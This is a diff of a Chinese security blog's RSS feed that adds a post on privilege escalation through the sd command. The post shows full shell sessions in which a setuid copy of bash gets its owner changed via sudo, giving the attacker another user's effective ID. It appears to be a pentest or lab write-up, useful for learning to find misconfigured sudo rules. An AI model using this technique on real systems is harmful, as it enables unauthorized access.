@@ -1,5 +1,70 @@
 <?xml version='1.0' encoding='UTF-8'?>
-<rss xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/" version="2.0"><channel><title>MJ</title><link>https://faabbi.github.io</link><description>嫉妒能让你前进，但也能让你陷入深渊。</description><copyright>MJ</copyright><docs>http://www.rssboard.org/rss-specification</docs><generator>python-feedgen</generator><image><url>https://avatars.githubusercontent.com/u/99706997?v=4</url><title>avatar</title><link>https://faabbi.github.io</link></image><lastBuildDate>Mon, 17 Nov 2025 16:25:11 +0000</lastBuildDate><managingEditor>MJ</managingEditor><ttl>60</ttl><webMaster>MJ</webMaster><item><title>weechat提权</title><link>https://faabbi.github.io/post/weechat-ti-quan.html</link><description>可以以root权限启动weechat时可以得到root权限
+<rss xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/" version="2.0"><channel><title>MJ</title><link>https://faabbi.github.io</link><description>嫉妒能让你前进，但也能让你陷入深渊。</description><copyright>MJ</copyright><docs>http://www.rssboard.org/rss-specification</docs><generator>python-feedgen</generator><image><url>https://avatars.githubusercontent.com/u/99706997?v=4</url><title>avatar</title><link>https://faabbi.github.io</link></image><lastBuildDate>Tue, 18 Nov 2025 08:38:35 +0000</lastBuildDate><managingEditor>MJ</managingEditor><ttl>60</ttl><webMaster>MJ</webMaster><item><title>sd提权</title><link>https://faabbi.github.io/post/sd-ti-quan.html</link><description>
+2025年11月13日
+
+
+==**在测试的过程中，发现sd命令执行后会改变源文件的属组，同样的sed命令就不具备这个产生漏洞的特性**==
+
+如图比如我们在渗透过程中已经拿到了系统的初始shell，如果我们能以某个用户的权限来执行sd命令，那么就可以利用sd命令来提升至该用户权限，看如下例子
+
+
+```
+www-data@Scanner:/tmp/test$ echo 123 &gt; test
+www-data@Scanner:/tmp/test$ ls -al
+total 12
+drwxrwxrwx 2 www-data www-data 4096 Nov 13 04:46 .
+drwxrwxrwt 3 root     root     4096 Nov 13 04:25 ..
+-rw-rw-rw- 1 www-data www-data    4 Nov 13 04:46 test
+www-data@Scanner:/tmp/test$ sudo -l
+Matching Defaults entries for www-data on Scanner:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User www-data may run the following commands on Scanner:
+    (welcome) NOPASSWD: /usr/bin/ln
+    (welcome) NOPASSWD: /usr/bin/sd
+www-data@Scanner:/tmp/test$ sudo -u welcome sd '' '' test
+www-data@Scanner:/tmp/test$ ls -al
+total 12
+drwxrwxrwx 2 www-data www-data 4096 Nov 13 04:46 .
+drwxrwxrwt 3 root     root     4096 Nov 13 04:25 ..
+-rw-rw-rw- 1 welcome  welcome     4 Nov 13 04:46 test
+
+```
+可以看到文件的属组已经从www-data变成了welcome
+
+所以我们可以通过低权限用户为属组自身的文件加s位，从而结合sd命令改变文件属组，造成漏洞提权
+
+
+```
+www-data@Scanner:/tmp/test$ cp /bin/bash ./bash1
+www-data@Scanner:/tmp/test$ ls -al
+total 1152
+drwxrwxrwx 2 www-data www-data    4096 Nov 13 04:48 .
+drwxrwxrwt 3 root     root        4096 Nov 13 04:25 ..
+-rwxr-xr-x 1 www-data www-data 1168776 Nov 13 04:48 bash1
+www-data@Scanner:/tmp/test$ chmod a+s bash1
+www-data@Scanner:/tmp/test$ ls -al
+total 1152
+drwxrwxrwx 2 www-data www-data    4096 Nov 13 04:48 .
+drwxrwxrwt 3 root     root        4096 Nov 13 04:25 ..
+-rwsr-sr-x 1 www-data www-data 1168776 Nov 13 04:48 bash1
+www-data@Scanner:/tmp/test$ sudo -u welcome sd '' '' bash1
+www-data@Scanner:/tmp/test$ ls -al
+total 1152
+drwxrwxrwx 2 www-data www-data    4096 Nov 13 04:48 .
+drwxrwxrwt 3 root     root        4096 Nov 13 04:25 ..
+-rwsr-sr-x 1 welcome  welcome  1168776 Nov 13 04:48 bash1
+www-data@Scanner:/tmp/test$ ./bash1 -p
+bash1-5.0$ id
+uid=33(www-data) gid=33(www-data) euid=1000(welcome) egid=1000(welcome) groups=1000(welcome),33(www-data)
+
+```
+可以看到目前已经提升到了welcome的权限
+
+
+此类操作特权提升手法，目前测试bash环境都可以成功，zsh环境则不行
+。</description><guid isPermaLink="true">https://faabbi.github.io/post/sd-ti-quan.html</guid><pubDate>Tue, 18 Nov 2025 08:38:10 +0000</pubDate></item><item><title>weechat提权</title><link>https://faabbi.github.io/post/weechat-ti-quan.html</link><description>可以以root权限启动weechat时可以得到root权限
 
 weechat时irc客户端，内置/exec可以执行系统命令但无回显，退出代码为0代表成功执行
 
